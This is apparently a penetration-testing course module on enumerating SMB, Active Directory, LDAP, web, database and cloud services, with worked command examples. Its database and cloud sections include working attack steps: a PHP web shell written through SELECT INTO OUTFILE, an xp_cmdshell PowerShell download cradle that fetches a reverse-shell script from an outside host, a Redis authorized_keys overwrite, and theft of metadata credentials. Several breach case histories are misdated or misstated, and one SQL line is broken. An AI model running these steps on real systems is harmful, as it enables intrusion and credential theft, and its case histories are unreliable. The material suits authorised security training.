sections.title: Why Enumeration is Different from Recon
sections.content:
Reconnaissance finds what exists. Enumeration extracts detailed information from what you found. If recon tells you 'port 445 is open', enumeration tells you 'SMB allows null sessions, domain is CORP.LOCAL, users include admin, jsmith, svc_backup, and the password policy requires 8 characters with lockout after 5 attempts.'

Enumeration is where you transition from 'I know the target exists' to 'I know how to attack it.' Every piece of information extracted during enumeration directly informs your exploitation strategy.

**Real-world tie-in:** During the 2016 Democratic National Committee (DNC) breach, APT28 (Fancy Bear) used extensive SMB and AD enumeration after initial access. They enumerated trust relationships, discovered privileged accounts, and used that intelligence to move laterally. The lesson: enumeration turns a foothold into a compromise.

**The 80/20 rule of enumeration:** 80% of the information you need comes from 20% of the services (SMB, LDAP, HTTP, DNS). Master those four thoroughly and you'll succeed on most engagements.

sections.title: SMB Enumeration — The Internal Pentest Goldmine
sections.content:
SMB (port 445) is the goldmine of internal pentesting. A single misconfigured SMB share can give you user lists, password policies, share contents, and group memberships.

**Worked example — Full SMB enumeration chain:**
```bash
# Step 1: Check if SMB is available and what version
$ nmap -p445 --script smb-protocols 10.10.10.50
Host is up (0.001s latency).
445/tcp open  microsoft-ds
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1)  # <-- v1 is bad, enables EternalBlue
|     2.02
|     3.00

# Step 2: Attempt null session enumeration
$ enum4linux-ng 10.10.10.50 -A
[+] OS: Windows Server 2022 Standard
[+] Domain: CORP
[+] Users: admin, jsmith, svc_backup, svc_sql, vpeters
[+] Groups: Domain Admins, Domain Users, Backup Operators
[+] Share listing:
    ADMIN$ - (hidden, no access)
    C$ - (hidden, no access)
    Backups - (READ access)  # <-- interesting!
    Shared - (READ/WRITE access)  # <-- very interesting!

# Step 3: Explore readable shares
$ smbclient //10.10.10.50/Backups -N
smb: \> ls
  .                                   D        0  Mon Jul  6 2024
  ..                                  D        0  Mon Jul  6 2024
  backup_script.ps1                   A     2048  Mon Jul  6 2024
  AD_export.csv                       A    45000  Sat Jul  4 2024
smb: \> get backup_script.ps1
smb: \> get AD_export.csv

# Step 4: Check the script for credentials
$ cat backup_script.ps1
$password = ConvertTo-SecureString "BackupPass2024!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("CORP\svc_backup", $password)
# <-- Now you have service account credentials!
```

**Gotcha:** Many organizations disable null sessions on Domain Controllers but forget about member servers — file servers, SQL servers, and web servers. Always enumerate multiple targets in the network. Also, SMBv1 being enabled is a massive red flag (EternalBlue/MS17-010). If you find it, document it at high severity regardless of whether you exploit it.

sections.title: Active Directory Enumeration — Understanding the Enterprise
sections.content:
Active Directory is the backbone of enterprise networks. Understanding AD structure is essential for internal pentesting.

**What to enumerate (in priority order):**
1. Users and their attributes (descriptions often contain passwords!)
2. Groups and memberships (who has privileged access?)
3. Computer objects (find targets for lateral movement)
4. GPOs (Group Policy — may reveal security settings)
5. Trusts (can you pivot to other domains?)
6. SPNs (Service Principal Names — targets for Kerberoasting)
7. ACLs (who can modify what? — path to privilege escalation)

**Worked example — BloodHound collection and analysis:**
```bash
# Linux collector (run from a compromised Linux host or jump box)
$ bloodhound-python -d corp.local -u jsmith -p 'Passw0rd!' -ns 10.10.10.10 -c All
INFO: Found 847 users, 342 groups, 124 computers, 32 GPOs
INFO: Output saved to 20240707_corp_local.zip

# Alternative — from a Windows host (more data, runs as current user)
PS > SharpHound.exe --CollectionMethods All --Domain corp.local --OutputDirectory C:\recon
PS > SharpHound.exe --CollectionMethods ACL --Domain corp.local --OutputDirectory C:\recon
# ACL-only takes 5 minutes vs 30+ for Full

# Upload to BloodHound GUI and run queries:
# Query: "Find Shortest Paths to Domain Admins"
# Result: DOMAIN USERS [memberof] IT_SUPPORT [RDP] FW-SERVER [SQLAdmin] SQL-SRV [AdminTo] DC-01
# This shows: get a domain user shell → RDP to firewall → use creds on SQL → admin to DC
# That's your attack chain!
```

**Gotcha:** BloodHound produces enormous datasets (thousands of relationships). Don't try to read it all — use the pre-built queries:
- "Shortest paths to Domain Admins"
- "Shortest paths to High Value Targets"
- "Kerberoastable Users"
- "AS-REP Roastable Users"
- "Users with most privileges"
Focus on these and you'll find the fastest path to domain compromise in minutes.

sections.title: Web Application Enumeration — Beyond Directory Brute-Force
sections.content:
Web enumeration goes far beyond running a wordlist against directories. Modern web apps require methodical information gathering.

**1. Technology Stack Identification:**
```bash
$ whatweb http://target.com
http://target.com [200 OK] Bootstrap, jQuery, PHP[7.4.3], MySQL, Apache[2.4.41], HTTPServer[Ubuntu]

$ whatweb http://target.com:8080
http://target.com:8080 [200 OK] nginx[1.20.1], Node.js, Express, Vite
# Two completely different stacks on the same target!
```

**2. Virtual Host Discovery:**
```bash
# Same IP may host multiple sites behind load balancers
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.target.com" -u http://TARGET_IP -fs 1234
internal        [200, 0.2s, 4567 bytes]  # different response size = different vhost
admin           [401, 0.1s, 234 bytes]   # 401 = exists but needs auth
dev             [200, 0.3s, 12000 bytes]  # dev site exposed!
```

**3. API Discovery:**
```
Look for:
- /api/ endpoints
- /swagger.json, /api-docs, /openapi.json
- /graphql (introspection may be enabled!)
- /.well-known/security.txt
- /.git/config — exposed git repo

$ curl -s http://target.com/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
# If this returns content, you can download the entire git repo!
```

**4. Parameter Discovery:**
```bash
# Hidden parameters via Arjun
$ arjun -u http://target.com/api/users
[+] Found parameter: id (potential SQLi/IDOR)
[+] Found parameter: token (potential auth bypass)
[+] Found parameter: debug (potential info disclosure)
```

**Gotcha:** Always check `robots.txt` and `sitemap.xml`, but don't assume they're exhaustive. What's DISALLOWED in robots.txt is exactly what you should test (and what attackers look for). Also check `security.txt` for responsible disclosure policies before testing.

**Real-world tie-in:** The 2021 T-Mobile breach exploited poor API enumeration. The attacker found an unauthenticated API endpoint via directory brute-force on a T-Mobile partner portal, then used it to query customer information en masse. The endpoint returned data via SSRF, allowing extraction of 50+ million customer records with minimal effort.

sections.title: LDAP Enumeration — The Directory Service
sections.content:
LDAP (port 389, 636 for LDAPS) is Active Directory's query interface. Anonymous or low-privilege LDAP queries can reveal the entire directory structure.

**Worked example — LDAP recon with ldapsearch:**
```bash
# Test anonymous bind (no creds needed)
$ ldapsearch -H ldap://10.10.10.10 -x -b "dc=corp,dc=local" -s base "(objectClass=*)" namingContexts
namingContexts: dc=corp,dc=local

# Enumerate all users (if anonymous bind enabled)
$ ldapsearch -H ldap://10.10.10.10 -x -b "dc=corp,dc=local" "(&(objectClass=user)(objectCategory=person))" sAMAccountName mail memberOf
# result: 847 user entries

# Find users with interesting descriptions
$ ldapsearch ... "(&(objectClass=user)(description=*password*))" sAMAccountName description
# sAMAccountName: svc_backup
# description: Default password is BackupAdmin2024!
# <-- People put passwords in the description field CONSTANTLY

# Find Domain Admins group members
$ ldapsearch ... "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" sAMAccountName
```

**Gotcha:** Many organizations think disabling anonymous LDAP bind protects their directory. But authenticated users (any domain user, including a compromised workstation account) can still query AD extensively. Once you have ANY set of domain credentials, re-enumerate everything — the results will be far richer than what null sessions provide.

**Real-world tie-in:** The NotPetya ransomware (2017) spread using LDAP/SMB enumeration. The worm queried AD for all domain computers, then used harvested credentials to deploy laterally via WMI. Total damage: $10+ billion. This is why proper AD hardening (disable SMBv1, enforce SMB signing, limit LDAP query scope) is critical.

sections.title: Enumerating Other Key Services
sections.content:
Beyond SMB, LDAP, and HTTP, several other services provide critical enumeration data.

**NFS (port 2049) — Shared filesystems:**
```bash
$ nmap -p2049 --script nfs-ls,nfs-showmount 10.10.10.50
NFS: Exported shares:
/home/users     (everyone mount, root_squash enabled)
/var/backups    (everyone mount, NO root_squash!)  # <-- dangerous!

# Mount without root_squash → write files as root on the NFS server
$ sudo mount -t nfs 10.10.10.50:/var/backups /mnt/backups
$ ls -la /mnt/backups
# You can now read/write files as the NFS UID/GID!
```

**SNMP (UDP 161) — Network device information leak:**
```bash
# Default community strings: public, private
$ snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.1.5.0  # System name
SNMPv2-MIB::sysName.0 = STRING: DC-01

$ snmpbulkwalk -v2c -c public 10.10.10.1 .1.3.6.1.4.1.77.1.2.25  # User accounts
# This reveals every Windows user account! (if SNMP is misconfigured)

# Even without the user enumeration MIB, check:
# - Running processes (reveals software versions)
# - Open TCP/UDP ports (compare with nmap results)
# - Routing tables (network topology)
# - Installed software (vulnerable versions)
```

**SMTP (port 25) — User enumeration via VRFY:**
```bash
$ telnet 10.10.10.50 25
HELO attacker
250 Hello
VRFY admin
252 Cannot VRFY user, but will take message for admin  # exists
VRFY nonexistent
550 User not found
# <-- Still works on many SMTP servers!

# Alternative: EXPN (expand mailing list)
EXPN all@corp.local
250 <admin@corp.local>
250 <jsmith@corp.local>
250 <support@corp.local>
```

**Gotcha:** NFS enumeration with `showmount -e` is often blocked by modern firewalls, but internal scans frequently find exposed NFS shares. If you find a share without root_squash, you can write an SSH key or a cron job directly to the target. This is a common path to initial access in internal tests.

sections.title: Automating Enumeration — Speed and Consistency
sections.content:
Manual enumeration is thorough but slow. For production pentests, you need automated enumeration that covers every service systematically.

**Automation framework — nse-autorun script suite:**
```bash
# Full automated enumeration against a discovered host
$ nmap -sV -sC -p- --script=vuln 10.10.10.50 -oA auto_enum/50 && \
  smbclient -L //10.10.10.50 -N >> auto_enum/50_smb.txt && \
  enum4linux-ng 10.10.10.50 -A > auto_enum/50_enum4linux.txt && \
  ldapsearch -H ldap://10.10.10.50 -x -b "dc=corp,dc=local" "(objectClass=*)" \
    > auto_enum/50_ldap.txt 2>&1

echo "Enumeration complete for 10.10.10.50"
```

**The enumeration decision tree:**
```
Port 21 (FTP)?    → Check anonymous login → browse files
Port 22 (SSH)?    → Version + banner grab → check default creds
Port 25 (SMTP)?   → VRFY/EXPN → user enumeration
Port 80/443?      → Full web enumeration
Port 139/445?     → Full SMB enumeration
Port 389/636?     → LDAP query → dump directory
Port 1433?        → MSSQL → check sa:sa, xp_cmdshell
Port 3306?        → MySQL → check root:root, information_schema
Port 2049?        → NFS → showmount, browse shares
Port 3389?        → RDP → version, check NLA
Port 5432?        → PostgreSQL → check postgres:postgres
Port 5900/5901?   → VNC → check auth required
Port 5985/5986?   → WinRM → credential brute-force or valid auth
Port 8080?        → Alternate web → directory enumeration
Port 27017?       → MongoDB → check auth enabled
```

**Scripting for efficiency:**
```bash
#!/bin/bash
# auto_enum.sh — Run against a single host
TARGET=$1
nmap -sV -sC -p- --min-rate=1000 $TARGET -oN nmap_$TARGET.txt 2>/dev/null &
wait
echo "Done: $(grep -c "/tcp" nmap_$TARGET.txt) open ports found"
```

**Gotcha:** Automated enumeration should NEVER replace manual analysis. Scripts miss edge cases: a service on a non-standard port, a custom protocol, a timing-based vulnerability that requires specific request patterns. Use automation to cast a wide net, then manually investigate every open port and every interesting finding. Automation finds the obvious; you find the creative.

**Real-world tie-in:** Many bug bounty hunters use `recon-ng` or custom bash pipelines to automate their entire enumeration workflow. A well-configured automation script can process 100+ targets in the time it takes to manually check one. Combine with Slack/Telegram notifications to get real-time alerts when juicy findings appear.

sections.title: Database Enumeration — Mining the Data Layer
sections.content:
Databases contain the most valuable data on any network. Enumerating them reveals credentials, sensitive data, and often provides escalation paths through database links.

**MySQL/MariaDB enumeration:**
```bash
# Step 1: Check if MySQL is accessible
$ nmap -p3306 --script mysql-info target.com
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.32
|   Thread ID: 42

# Step 2: Try default credentials
$ mysql -h target.com -u root -p''
$ mysql -h target.com -u root -p'root'
$ mysql -h target.com -u admin -p'admin'
# Success? You now have database access

# Step 3: Enumerate databases and tables
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
| app_db             |
+--------------------+

mysql> USE app_db;
mysql> SHOW TABLES;
+-------------------+
| Tables_in_app_db  |
+-------------------+
| users             |
| products          |
| sessions          |
| api_keys          |  # <-- Interesting!
+-------------------+

mysql> SELECT CONCAT(user, ':', password_hash) FROM users;
admin:$2y$10$...
jsmith:5f4dcc3b5aa765d61d8327deb882cf99

# Step 4: Check for FILE privilege (can write webshell?)
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
# If FILE privilege is granted AND MySQL data directory is writable by web server... RCE
```

**Microsoft SQL Server (MSSQL) enumeration:**
```bash
# Step 1: Check for MSSQL
$ nmap -p1433 --script ms-sql-info target.com

# Step 2: Try default credentials
$ impacket-mssqlclient sa:sa@target.com
$ impacket-mssqlclient sa:''@target.com
$ impacket-mssqlclient admin:admin@target.com

# Step 3: If connected, enumerate and escalate
mssql> SELECT @@version;
mssql> SELECT name FROM sys.databases;
mssql> SELECT * FROM app_db.INFORMATION_SCHEMA.TABLES;

# Step 4: Check for xp_cmdshell (RCE via SQL Server)
mssql> EXEC xp_cmdshell 'whoami';
# If this works, you have OS command execution as the SQL Server service account
# If not (xp_cmdshell is disabled by default), enable it:
mssql> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
mssql> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
mssql> EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.5/rev.ps1\")"';
# Now you have a reverse shell as the MSSQL service account

# Step 5: Check for linked servers (lateral movement)
mssql> SELECT srvname, srvid FROM master..sysservers;
# If linked servers exist, you can query them through the current server
mssql> SELECT * FROM OPENQUERY([DC-01"], 'SELECT name FROM master..sysdatabases') 2>&1
```

**Redis enumeration (in-memory database, often unauthenticated):**
```bash
# Check if Redis accepts connections
$ nmap -p6379 --script redis-info target.com

# Connect without auth (default — many Redis instances have no password!)
$ redis-cli -h target.com
target.com:6379> INFO
# If this returns server info, you're in!

# Dangerous Redis misconfigurations:
# 1. No auth → read/write all keys
target.com:6379> KEYS *
1) "session:abc123"
2) "user:jsmith"
3) "cache:api_response"

# 2. RCE via SSH key overwrite (if Redis runs as root!)
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/ssh_key.txt
$ redis-cli -h target.com
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename "authorized_keys"
> SAVE
# If Redis runs as root (common in badly configured containers), 
# you just overwritten root's authorized_keys
> ssh root@target.com  # No password needed!
```

**MongoDB enumeration:**
```bash
# Check if MongoDB is open (default: no auth)
$ nmap -p27017 --script mongodb-info target.com

# Connect without credentials
$ mongosh mongodb://target.com:27017
> show dbs
admin   100 MB
app_db  500 MB
> use app_db
> db.getCollectionNames()
["users", "orders", "products", "api_keys"]
> db.users.find().limit(5)
{ "_id": ObjectId(...), "username": "admin", "password_hash": "...", "role": "admin" }
```

**Gotcha:** Database services listening on localhost (127.0.0.1) won't appear in your nmap scan at all! You must first compromise the host (via web app, SSH, etc.) and then enumerate localhost services with `ss -tlnp` or `netstat -ano`. This is why exploiting a web application first often reveals a MySQL/MongoDB that's only accessible from the web server itself — and is rarely patched.

**Real-world tie-in:** The 2019 DoorDash breach (data: 4.9M customers) began with a compromised third-party vendor's access. Attackers found an exposed internal MongoDB instance during internal recon, extracted API keys and database credentials, and used them to pivot to DoorDash's production database. The database had no authentication configured because it was "only accessible internally." Internal databases are protected by network security — assume they're exposed until proven otherwise.

sections.title: Cloud Service Enumeration — AWS, Azure, and GCP
sections.content:
Cloud services use different enumeration techniques than traditional networks. Instead of port scanning (most cloud services are API-based), you enumerate by querying service endpoints and testing configurations.

**AWS S3 bucket enumeration:**
```bash
# Manual bucket discovery
$ curl -s -o /dev/null -w "%{http_code}" https://target-backups.s3.amazonaws.com/
200  # Publicly accessible bucket!

# Automated bucket enumeration
$ s3scanner --bucket target-backups
[+] target-backups — Accessible (READ)

# List objects in a public bucket
$ aws s3 ls s3://target-backups --no-sign-request --recursive
2024/01/15  14:30:00    500MB  backups/production_db_2024-01-15.sql.gz
2024/01/14  14:30:00    480MB  backups/production_db_2024-01-14.sql.gz
# <-- Full production database backups, publicly accessible!

# Download and analyze
$ aws s3 cp s3://target-backups/backups/production_db_2024-01-15.sql.gz . --no-sign-request
$ gunzip production_db_2024-01-15.sql.gz
$ head -100 production_db_2024-01-15.sql
# Extract credentials, PII, internal IPs from the DB backup
```

**Azure Blob storage enumeration:**
```bash
# Discover storage accounts from domain names
$ cloud_enum -k target -m azure
[+] targetbackup.blob.core.windows.net — accessible
[+] targetstorage.blob.core.windows.net — accessible

# List blob containers
$ curl -s https://targetbackup.blob.core.windows.net/?restype=container&comp=list
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults>
  <Blobs>
    <Blob>
      <Name>backups/</Name>
    </Blob>
  </Blobs>
</EnumerationResults>

# Download Azure blobs
$ az storage blob download --account-name targetbackup \
  --container-name backups --name db.sql.gz --file db.sql.gz --auth-mode anonymous
```

**GCP Storage bucket enumeration:**
```bash
# Discover GCS buckets
$ cloud_enum -k target -m gcp
[+] target-data.storage.googleapis.com — accessible

# List objects via API
$ curl -s https://storage.googleapis.com/storage/v1/b/target-data/o
{
  "items": [
    {"name": "customer_pii.csv", "size": "50000000"}
  ]
}

# Download using gsutil
$ gsutil ls gs://target-data/
$ gsutil cp gs://target-data/customer_pii.csv .
```

**Cloud metadata enumeration (from compromised cloud resources):**
```bash
# If you have a shell on an EC2 instance:
# AWS metadata endpoint
$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
EC2-WebServerRole  # <-- IAM role name

$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-WebServerRole
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-07-09T12:00:00Z"
}
# These are TEMPORARY credentials valid for ~6 hours — ACT NOW

# Azure metadata endpoint
$ curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true
{
  "access_token": "eyJ0eXAiOi...",
  "expires_on": "2026-07-09T12:00:00Z"
}

# GCP metadata endpoint
$ curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
{
  "access_token": "ya29...",
  "expires_in": 3600
}
```

**Gotcha:** Cloud metadata endpoints are ONLY accessible from resources running inside the cloud. From the outside, these IPs are either unreachable or belong to different services. The ONLY way to access metadata endpoints externally is through Server-Side Request Forgery (SSRF) — which is why SSRF in cloud environments is treated as HIGH/CRITICAL. Also: cloud credentials have EXPIRY and SCOPE. AWS temporary credentials expire in ~6 hours. GCP tokens expire in ~1 hour. Always check the expiry time and plan your exploitation within that window.

**Real-world tie-in:** The 2020 Capital One breach demonstrates the full cloud recon chain: SSRF on a web application → reach AWS metadata endpoint → extract IAM role credentials → enumerate S3 buckets → find and exfiltrate data. The attacker used a single SSRF vulnerability to reach the metadata endpoint, obtained credentials for an IAM role that had S3 read access to ALL buckets, and extracted 30TB of data over several weeks. The role had over-permissive policies — allowing S3:GetObject on all buckets when only specific buckets were needed.
